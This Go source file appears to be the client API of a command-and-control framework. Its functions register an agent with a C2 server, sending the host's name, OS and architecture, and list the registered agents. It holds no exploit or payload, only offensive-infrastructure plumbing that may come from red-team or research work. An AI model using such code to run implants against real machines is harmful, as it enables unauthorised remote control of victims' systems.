package c2api

import (
	"bytes"
	"encoding/json"
	"io"
	"net/http"
)

// Identify should be called prior to interacting with the system.
// It allows an agent to make itself known to the C2 server.
func Identify(hostname, os, arch string) (id string, err error) {
	payload := Agent{
		Hostname: hostname,
		OS:       os,
		Arch:     arch,
	}

	jsonPayload, err := json.Marshal(&payload)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/agents", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return "", err
	}

	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}

	var respCtx struct {
		ID string `json:"id"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&respCtx); err != nil {
		return "", err
	}

	return respCtx.ID, nil
}

// GetAgents asks the C2 for the list of agents.
func GetAgents() (agents []Agent, err error) {
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/agents", nil)
	if err != nil {
		return nil, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if err := json.Unmarshal(respBody, &agents); err != nil {
		return nil, err
	}

	return agents, nil
}
